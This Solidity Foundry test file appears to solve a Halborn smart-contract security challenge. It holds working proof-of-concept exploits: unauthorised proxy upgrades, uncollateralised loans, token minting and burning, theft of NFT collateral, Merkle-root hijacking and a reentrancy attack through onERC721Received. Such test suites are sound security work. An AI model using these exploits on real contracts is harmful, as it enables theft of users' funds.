// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

import {IERC721ReceiverUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/token/ERC721/IERC721ReceiverUpgradeable.sol";

import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";


import {AttackerHalbornLoans} from "../src/AttackerHalbornLoans.sol";
import {AttackerHalbornNFT} from "../src/AttackerHalbornNFT.sol";
import {AttackerHalbornToken} from "../src/AttackerHalbornToken.sol";

//import attacking smart contract


contract HalbornTest is Test {
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;

    ERC1967Proxy public nftProxy;
    ERC1967Proxy public tokenProxy;
    ERC1967Proxy public loanProxy;

    function setUp() public {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        // create nft proxy
        nftProxy = new ERC1967Proxy(address(nft), "");
        nft = HalbornNFT(address(nftProxy));
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        // create token proxy
        tokenProxy = new ERC1967Proxy(address(token), "");
        token = HalbornToken(address(tokenProxy));

        token.initialize();

        loans = new HalbornLoans(2 ether);
        // create loans proxy
        bytes memory initLoanData = abi.encodeWithSelector(HalbornLoans.initialize.selector, address(token), address(nft));
        loanProxy = new ERC1967Proxy(address(loans), initLoanData);
        loans = HalbornLoans(address(loanProxy));

        token.setLoans(address(loans));
    }

    // Set up actors
    address public immutable EVE = makeAddr("EVE");

    // This vulnerability permits getting a loan without having collateral
    function testVULN01() public {
        // Eve takes a loan without having deposited any NFTs into the HalbornLoans 
        vm.startPrank(EVE);

        console.log(token.balanceOf(EVE));
        console.log("Balance of EVE before loan:" , token.balanceOf(EVE));

        assertTrue(nft.balanceOf(EVE) == 0, "Eve should not have NFTs");
        assertTrue(loans.totalCollateral(EVE) == 0, "Eve should not have any collateral");

        //eve can take a loan without any prior collateral
        loans.getLoan(2 ether);
        console.log(token.balanceOf(EVE));
        console.log("Balance of EVE after loan: " , token.balanceOf(EVE));

        assertTrue(token.balanceOf(EVE) == 2 ether, "Eve should have got her collateral");
        vm.stopPrank();
    }


    // This vulnerability permits upgrading the ERC1967 
    // proxy for the NFT without being owner

    AttackerHalbornNFT public attacker_nft;
    function testVULN02() public {
        //ALICE and BOB purchase 3 nfts, using 3 ethers

        deal(BOB, 2 ether);
        vm.prank(BOB);
        nft.mintBuyWithETH{value: 1 ether}();
        vm.prank(BOB);
        nft.mintBuyWithETH{value: 1 ether}();
        deal(ALICE, 1 ether);
        vm.prank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();

        assert(nft.balanceOf(ALICE) == 1);
        assert(nft.balanceOf(BOB) == 2);

        //The contract does now have 3 ether inside
        assert(address(nft).balance == 3 ether);

        //deploy a new NFT malicious implementation (AttackerHalbornNFT) 
        //and then upgrade to that new deployment.

        vm.startPrank(EVE);
        //EVE is not the owner of HalbornNFT
        assert(address(EVE) != nft.owner());
        attacker_nft = new AttackerHalbornNFT();
        //Update HalbornNFT to new implementation, so EVE is the owner
        nft.upgradeTo(address(attacker_nft));
        nft.initialize("", 1 ether);
        
        //EVE is now the owner of HalbornNFT
        assert(address(EVE) == nft.owner());

        /*  
            Because EVE is the new owner of the contract, there are 
            restricted functions that EVE is now able to call. 
            Next each vulnerability is explained and tested

            - VULN02-01: Abbility to withdraw all ETH of NFT contract.
            - VULN02-02: Possibility to set a new price for the NFTs.
        */ 

        // ====== VULN02-01 ====== // 
        //The balance of the smart contract is still 3 ethers
        //EVE (as is the new owner) is able to withdraw everything 
        assert(address(nft).balance == 3 ether);
        nft.withdrawETH(3 ether);
        assert(address(EVE).balance == 3 ether);

        
        // ====== VULN02-02 ====== // 
        //The price of each NFT is 1 ether
        //EVE (as is the new owner) is able to change it 
        //We deleted the require statement of the AttackerHalbornNFT contract
        //so we are able to mint NFTs for free

        uint256 NFTprice = nft.price();
        assert(NFTprice == 1 ether);
        nft.setPrice(0 ether);
        //create a for loop to mint 10 nfts
        for (uint i = 0; i < 10; i++) {
            nft.mintBuyWithETH{value: 0 ether}();
        }
        assert(nft.balanceOf(EVE) == 10);
        vm.stopPrank();
    }


    // This vulnerability permits upgrading the ERC1967 
    // proxy for the Tokens without being owner

    AttackerHalbornToken public attacker_token;
    function testVULN03() public {
        vm.startPrank(EVE);
        //EVE deploys a new smart contract (AttackerHalbornToken)
        //which implement new features that are not allowed in the original contract 
        attacker_token = new AttackerHalbornToken();
        token.upgradeTo(address(attacker_token));

        token.initialize();
        assert(address(EVE) == token.owner());

        /*  
            Because EVE is the new owner of the contract with new functionalities
            there are (previously) restricted functions that EVE is now able to call. 
            Next each vulnerability is explained and tested

            - VULN03-01: Abbility to mint unlimited tokens.
            - VULN03-02: Possibility of burning tokens of other users.
            - VULN03-03: DDoS by setting halbornLoans to any address.

        */ 
        // ====== VULN03-01 ====== // 
        token.mintToken(EVE, 1000);
        assert(token.balanceOf(EVE) == 1000);

        // ====== VULN03-02 ====== //
        token.mintToken(BOB, 5);
        assert(token.balanceOf(BOB) == 5);
        token.burnToken(BOB, 5);
        assert(token.balanceOf(BOB) == 0);

        // ====== VULN03-03 ====== // 
        //EVE is able to set halbornLoans to any address
        //we set it to address(0), making the contract unusable
        //it also could have been updated to point to a malicious contract
        token.setLoans(address(0));
        assert(address(0) == token.halbornLoans());
        vm.stopPrank();
    }



    // This vulnerability permits upgrading the ERC1967 
    // proxy for the Loans without being owner

    AttackerHalbornLoans public attacker_loans;
    function testVULN04() public {

        vm.startPrank(EVE);
        
        //EVE deploys a new smart contract (AttackerHalbornLoans)
        attacker_loans = new AttackerHalbornLoans(2 ether);
        loans.upgradeTo(address(attacker_loans));
        attacker_loans.initialize(address(token), address(nft));
        //as we implemented new functions, we have to set the proxy as AttackerHalbornLoans
        attacker_loans = AttackerHalbornLoans(address(loans));
        /*  
            Because EVE is the new owner of the contract, she is able 
            to access (previously) restricted functions. 
            Next, each new vulnerability that was 
            introduced is explained and tested

            - VULN04-01: Abbility to mint unlimited tokens.
            - VULN04-02: Possibility of burning tokens of other users.
            - VULN04-03: Withdraw collateral of other people (steal their NFTs).

        */ 
    
        // ====== VULN04-01 ====== //
        assert(token.balanceOf(EVE) == 0); 
        //EVE is able to mint unlimited tokens
        //by calling the new mint function in attacker_loans
        attacker_loans.mint(1000);
        assert(token.balanceOf(EVE) == 1000);

        // ====== VULN04-02 ====== //
        //BOB has 5 tokens
        deal(address(token), BOB, 5);
        assert(token.balanceOf(BOB) == 5);
        //EVE is able to burn BOB's tokens
        attacker_loans.burnTokens(BOB, 5);
        assert(token.balanceOf(BOB) == 0);
        vm.stopPrank();


        // ====== VULN04-03 ====== //   
        //We will make BOB purchase a nft and deposit it as collateral
        deal(BOB, 1 ether); 
        vm.startPrank(BOB);
        nft.mintBuyWithETH{value: 1 ether}();
        assert(nft.balanceOf(BOB) == 1);
        nft.approve(address(loans), 1);
        loans.depositNFTCollateral(1);
        vm.stopPrank();

        //EVE is able to withdraw BOB's collateral
        vm.prank(EVE);
        loans.withdrawCollateral(1);
        assert(nft.balanceOf(EVE) == 1);
        assert(nft.balanceOf(BOB) == 0);
        assert(nft.ownerOf(1) == EVE);
    }


    // update merkle tree and mint tokens with valid proof
    // this makes any malicious actor able to create airdrops to anyone 

    function testVULN05() public {
        assert(nft.balanceOf(EVE)==0);
        vm.startPrank(EVE);
        Merkle m = new Merkle();
        bytes32[] memory data = new bytes32[](2);
        data[0] = keccak256(abi.encodePacked(EVE, uint256(1)));
        data[1] = keccak256(abi.encodePacked(EVE, uint256(2)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);
        bytes32[] memory proof_2 = m.getProof(data, 1);

        nft.setMerkleRoot(root);
        nft.mintAirdrops(2, proof_2);
        //eve now has 1 nft
        assert(nft.balanceOf(EVE)==1);       
    }

    // reentrancy vulnerability allows getting loans without having enough collateral
    // to do so, we have to change the fallback function onERC721Received. 
    // This makes that before exiting it, withdrawCollateral function is called again. 
    bool public attacking = false;
    function testVULN06() public {
        deal(address(this), 3 ether);
        assert(nft.balanceOf(EVE)==0);       

        //Start by purchasing 3 nfts and deposit them into the loans contract
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        nft.approve(address(loans), 3);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);
        loans.depositNFTCollateral(3);

        //all our 3 ethers are in the loans contract
        assert(nft.balanceOf(address(this)) == 0);
        //because we deposited 3 nfts, we have 6 ether as collateral
        assert(loans.totalCollateral(address(this)) == 6 ether);

        //as we implemented the reentrancy in the next onERC721Received
        //we set a lock (attacking), that will make the attack. 
        //This attack happens because we receive the nft, and then we call the
        //withdrawCollateral function again, before exiting the onERC721Received function.
        attacking = true;
        loans.withdrawCollateral(1);
        //we have took a loan of maximum value, and we have our 3 nfts back
        assert(token.balanceOf(address(this)) == type(uint256).max);
        assert(nft.balanceOf(address(this)) == 3);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if(attacking) {
            attacking = false;
            console.log("Attacking");
            loans.withdrawCollateral(2);
            loans.withdrawCollateral(3);           
            loans.getLoan(type(uint256).max);
        }
        return this.onERC721Received.selector;
    }
}
